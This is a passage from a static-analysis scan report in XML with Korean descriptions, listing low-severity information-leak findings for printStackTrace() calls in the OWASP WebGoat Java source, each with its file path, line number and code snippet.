                            <Abstract>SQLInjection.java의 handleRequest() 함수는 361 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>SQLInjection.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/SQLInjection.java</FilePath>
<LineStart>361</LineStart>
<Snippet>		s.setMessage("You are not authorized to perform this function");
		System.out.println("Authorization failure");
		ue2.printStackTrace();
	    }
	    catch (Exception e)</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="3DDF4C741AC3A01CBE48D925C7B3268F" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>UpdateProfile.java의 createEmployeeProfile() 함수는 351 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>UpdateProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/UpdateProfile.java</FilePath>
<LineStart>351</LineStart>
<Snippet>	{
	    s.setMessage("Error updating employee profile");
	    e.printStackTrace();
	}
    }</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="5C590077BD415569074E3ADC37FB4548" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>CreateDB.java의 createProductTable() 함수는 203 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>CreateDB.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/CreateDB.java</FilePath>
<LineStart>203</LineStart>
<Snippet>	{
	    System.out.println("Error creating product database");
	    e.printStackTrace();
	}
</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="E8EF5733799D99324748E618EBE6DC59" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>JSONInjection.java의 handleRequest() 함수는 98 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>JSONInjection.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/JSONInjection.java</FilePath>
<LineStart>98</LineStart>
<Snippet>	catch (Exception ex)
	{
	    ex.printStackTrace();
	}
</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="96C276DAF9BB2936A2F0FEB3DA40763A" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>UpdateProfile.java의 getNextUID() 함수는 257 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>UpdateProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/UpdateProfile.java</FilePath>
<LineStart>257</LineStart>
<Snippet>	catch (SQLException sqle)
	{
	    sqle.printStackTrace();
	    s.setMessage("Error updating employee profile");
	}</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="348D9FB5ADC466B0BF5C0E5163F660CB" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>UpdateProfile.java의 createEmployeeProfile() 함수는 345 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>UpdateProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/UpdateProfile.java</FilePath>
<LineStart>345</LineStart>
<Snippet>	    {
		s.setMessage("Error updating employee profile");
		sqle.printStackTrace();
	    }
	}</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="51602EFB444788618FD1F4B49284D96E" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>Login.java의 login_BACKUP() 함수는 211 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>Login.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/Login.java</FilePath>
<LineStart>211</LineStart>
<Snippet>	{
	    s.setMessage("Error logging in");
	    e.printStackTrace();
	}
</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="6848A018EE47A64FCA5A0F716FFE688A" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>CrossSiteScripting.java의 handleRequest() 함수는 385 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>CrossSiteScripting.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/CrossSiteScripting.java</FilePath>
<LineStart>385</LineStart>
<Snippet>		// All other errors send the user to the generic error page
		System.out.println("handleRequest() error");
		e.printStackTrace();
		setCurrentAction(s, ERROR_ACTION);
	    }</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="8E895F72A0E053B9527EBDA1C3B8F849" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>Logout.java의 handleRequest() 함수는 76 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>Logout.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/Logout.java</FilePath>
<LineStart>76</LineStart>
<Snippet>	{
	    System.out.println("Internal server error");
	    ue2.printStackTrace();
	}
</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="D872647971F4264544026202303B0C13" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>FindProfile.java의 handleRequest() 함수는 121 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>FindProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/FindProfile.java</FilePath>
<LineStart>121</LineStart>
<Snippet>		{
		    System.out.println("Internal server error");
		    ue1.printStackTrace();
		}
		catch (UnauthorizedException ue2)</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="E39A9E190CF6A50B4EEB36F90B79EEEE" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>ListStaff.java의 getAllEmployees_BACKUP() 함수는 163 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>ListStaff.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/ListStaff.java</FilePath>
<LineStart>163</LineStart>
<Snippet>	    {
		s.setMessage("Error getting employees");
		sqle.printStackTrace();
	    }
	}</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="CAF560698F78E62F29FC0CF1F6955816" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>Login.java의 login() 함수는 169 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>Login.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/Login.java</FilePath>
<LineStart>169</LineStart>
<Snippet>	{
	    s.setMessage("Error logging in");
	    e.printStackTrace();
	}
</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="B98B6B12E7E2107A2C5FB412E8074669" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>HammerHead.java의 doPost() 함수는 192 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>HammerHead.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/HammerHead.java</FilePath>
<LineStart>192</LineStart>
<Snippet>	catch (Throwable t)
	{
	    t.printStackTrace();
	    log("ERROR: " + t);
	    screen = new ErrorScreen(mySession, t);</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="4FDA9B15885A673A877D3550A8CABB1E" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>ViewProfile.java의 getEmployeeProfile() 함수는 140 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/ViewProfile.java</FilePath>
<LineStart>140</LineStart>
<Snippet>	    {
		s.setMessage("Error getting employee profile");
		sqle.printStackTrace();
	    }
	}</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="62FF1026DD549BC6C832899FFA125D79" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>ViewProfile.java의 getEmployeeProfile_BACKUP() 함수는 220 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/ViewProfile.java</FilePath>
<LineStart>220</LineStart>
<Snippet>	    {
		s.setMessage("Error getting employee profile");
		sqle.printStackTrace();
	    }
	}</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="0399A1EC2D554723E3929010E2556E8C" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>Login.java의 handleRequest() 함수는 95 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>Login.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/Login.java</FilePath>
<LineStart>95</LineStart>
<Snippet>		{
		    System.out.println("Internal server error");
		    ue1.printStackTrace();
		}
		catch (UnauthorizedException ue2)</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="94BC2CB125163422C63F4E162F0FF0CB" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>CrossSiteScripting.java의 handleRequest() 함수는 360 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>CrossSiteScripting.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/CrossSiteScripting.java</FilePath>
<LineStart>360</LineStart>
<Snippet>	    {
		System.out.println("Missing parameter");
		pnfe.printStackTrace();
		setCurrentAction(s, ERROR_ACTION);
	    }</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="AFC4AB32F20D390E9F9D1EC215C5F28B" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>RefreshDBScreen.java의 refreshDB() 함수는 169 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>RefreshDBScreen.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/admin/RefreshDBScreen.java</FilePath>
<LineStart>169</LineStart>
<Snippet>	    s.setMessage("Error refreshing database "
		    + this.getClass().getName());
	    e.printStackTrace();
	}
    }</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="53B038E0AE5B68AA1F4A9E8507FB4AAC" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>SqlNumericInjection.java의 parameterizedQuery() 함수는 242 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>SqlNumericInjection.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SqlNumericInjection.java</FilePath>
<LineStart>242</LineStart>
<Snippet>	{
	    s.setMessage("Error generating " + this.getClass().getName());
	    e.printStackTrace();
	}
</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="65081290A748CDED3B8C7556ECE0F677" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>UpdateProfile.java의 createEmployeeProfile() 함수는 321 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>UpdateProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/UpdateProfile.java</FilePath>
<LineStart>321</LineStart>
<Snippet>	catch (Exception e)
	{
	    e.printStackTrace();
	    s.setMessage("Error updating employee profile");
	}</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="163B719F69C0908312A41CC536248C81" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>CrossSiteScripting.java의 handleRequest() 함수는 366 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>CrossSiteScripting.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/CrossSiteScripting.java</FilePath>
<LineStart>366</LineStart>
<Snippet>	    {
		System.out.println("Validation failed");
		ve.printStackTrace();
		setCurrentAction(s, ERROR_ACTION);
	    }</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="4808FFAF7D3634E85349E16A6E77465F" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>FindProfile.java의 findEmployeeProfile() 함수는 181 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>FindProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/FindProfile.java</FilePath>
<LineStart>181</LineStart>
<Snippet>	    {
		s.setMessage("Error finding employee profile");
		sqle.printStackTrace();
	    }
	}</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="1DF65556F09BBF74F1A33163DDB09405" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>ViewProfile.java의 getEmployeeProfile_BACKUP() 함수는 212 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/ViewProfile.java</FilePath>
<LineStart>212</LineStart>
<Snippet>	{
	    s.setMessage("Error getting employee profile");
	    e.printStackTrace();
	}
</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="271C9A6472859F4F33CAACB572549F42" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>EditProfile.java의 getEmployeeProfile() 함수는 131 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/EditProfile.java</FilePath>
<LineStart>131</LineStart>
<Snippet>	{
	    s.setMessage("Error getting employee profile");
	    e.printStackTrace();
	}
</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="7DEFC09894FCD4141B09E0898E429C4A" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>ListStaff.java의 getAllEmployees_BACKUP() 함수는 169 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>ListStaff.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/ListStaff.java</FilePath>
<LineStart>169</LineStart>
<Snippet>	{
	    s.setMessage("Error getting employees");
	    e.printStackTrace();
	}
</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="12A7BB006A4A13923C074307011194B8" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>UpdateProfile.java의 changeEmployeeProfile_BACKUP() 함수는 237 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>UpdateProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/UpdateProfile.java</FilePath>
<LineStart>237</LineStart>
<Snippet>	{
	    s.setMessage("Error updating employee profile");
	    e.printStackTrace();
	}
    }</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="95DE204D0F2739B96963DADDC6173ABA" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>SqlNumericInjection.java의 injectableQuery() 함수는 162 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>SqlNumericInjection.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SqlNumericInjection.java</FilePath>
<LineStart>162</LineStart>
<Snippet>	{
	    s.setMessage("Error generating " + this.getClass().getName());
	    e.printStackTrace();
	}
</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="2A4E10165937706D57A241B308EAA8AE" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>CreateDB.java의 createMessageTable() 함수는 165 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>CreateDB.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/CreateDB.java</FilePath>
<LineStart>165</LineStart>
<Snippet>	{
	    System.out.println("Error creating message database");
	    e.printStackTrace();
	}
    }</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="F25983B958BB80B53993CD341D48CED5" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>UpdateProfile.java의 changeEmployeeProfile_BACKUP() 함수는 230 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>UpdateProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/UpdateProfile.java</FilePath>
<LineStart>230</LineStart>
<Snippet>	    {
		s.setMessage("Error updating employee profile");
		sqle.printStackTrace();
	    }
</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="9EA2F7ECE0EB7F2DFEA0C97602F3136D" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>DOMInjection.java의 createContent() 함수는 92 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>DOMInjection.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/DOMInjection.java</FilePath>
<LineStart>92</LineStart>
<Snippet>	{
	    s.setMessage("Error generating " + this.getClass().getName());
	    e.printStackTrace();
	}
</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="4955E5682DB1F23BC21B272890D9F5DD" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>XMLInjection.java의 handleRequest() 함수는 128 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>XMLInjection.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/XMLInjection.java</FilePath>
<LineStart>128</LineStart>
<Snippet>	catch (Exception ex)
	{
	    ex.printStackTrace();
	}
</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="BCA2815261DDE9801EF85E500931CC3B" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>SqlNumericInjection.java의 handleRequest() 함수는 401 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>SqlNumericInjection.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SqlNumericInjection.java</FilePath>
<LineStart>401</LineStart>
<Snippet>	{
	    System.out.println("Exception caught: " + e);
	    e.printStackTrace(System.out);
	}
    }</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="3F6FFF90338B5D7AD8036C3213B71E6F" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>DefaultLessonAction.java의 isAuthorizedForEmployee() 함수는 320 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>DefaultLessonAction.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/DefaultLessonAction.java</FilePath>
<LineStart>320</LineStart>
<Snippet>			{
